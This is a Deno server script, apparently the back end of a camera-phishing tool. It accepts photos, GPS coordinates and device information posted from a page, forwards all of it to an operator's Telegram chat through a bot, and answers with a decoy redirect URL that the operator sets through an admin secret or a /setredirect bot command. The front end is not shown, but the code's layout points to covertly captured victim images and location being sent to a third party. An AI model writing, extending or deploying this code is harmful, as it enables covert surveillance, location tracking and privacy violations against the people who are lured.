function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(',')[1]);
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

async function sendMessage(token, chatId, text) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text })
  });
}

Deno.serve(async (request) => {
  const url = new URL(request.url);
  const path = url.pathname;

  // 1. Receive photos & send to Telegram
  if (path === '/send' && request.method === 'POST') {
    try {
      const { photos, latitude, longitude, deviceInfo } = await request.json();
      if (!photos || photos.length === 0) {
        return new Response(JSON.stringify({ error: 'No photos' }), { status: 400 });
      }

      const botToken = Deno.env.get('BOT_TOKEN');
      const chatId = Deno.env.get('CHAT_ID');
      const kv = await Deno.openKv();

      for (let i = 0; i < photos.length; i++) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        const blob = dataURItoBlob(photos[i]);
        formData.append('photo', blob, `image_${i + 1}.jpg`);

        let caption = `Photo #${i + 1} of ${photos.length}`;
        if (latitude && longitude) {
          caption += `\nLocation: ${latitude}, ${longitude}`;
        }
        if (i === 0 && deviceInfo) {
          caption += `\n\nDevice Info:\n${JSON.stringify(deviceInfo, null, 2)}`;
        }
        formData.append('caption', caption);

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }

      const redirectResult = await kv.get(['redirect_url']);
      const redirectTo = redirectResult.value || 'https://example.com';

      return new Response(JSON.stringify({ success: true, redirect: redirectTo }), {
        headers: { 'Content-Type': 'application/json' }
      });
    } catch (err) {
      return new Response(JSON.stringify({ error: err.message }), { status: 500 });
    }
  }

  // 2. Set redirect URL (from admin panel)
  if (path === '/set-redirect' && request.method === 'POST') {
    const { url: newUrl, secret } = await request.json();
    const adminSecret = Deno.env.get('ADMIN_SECRET');
    if (secret !== adminSecret) {
      return new Response('Unauthorized', { status: 403 });
    }
    const kv = await Deno.openKv();
    await kv.set(['redirect_url'], newUrl);
    return new Response(JSON.stringify({ success: true }), {
      headers: { 'Content-Type': 'application/json' }
    });
  }

  // 3. Telegram Webhook (for /setredirect command)
  if (path === '/telegram-webhook' && request.method === 'POST') {
    const update = await request.json();
    const message = update.message;
    if (!message || !message.text) return new Response('ok');

    const chatId = message.chat.id.toString();
    const text = message.text.trim();
    const botToken = Deno.env.get('BOT_TOKEN');
    const adminChatId = Deno.env.get('CHAT_ID');

    if (chatId !== adminChatId) {
      await sendMessage(botToken, chatId, 'Not authorized.');
      return new Response('ok');
    }

    if (text.startsWith('/setredirect')) {
      const parts = text.split(' ');
      if (parts.length < 2) {
        await sendMessage(botToken, chatId, 'Usage: /setredirect <URL>');
      } else {
        const newRedirectUrl = parts[1];
        const kv = await Deno.openKv();
        await kv.set(['redirect_url'], newRedirectUrl);
        await sendMessage(botToken, chatId, `Redirect URL updated to: ${newRedirectUrl}`);
      }
    }
    return new Response('ok');
  }

  return new Response('Not Found', { status: 404 });
});
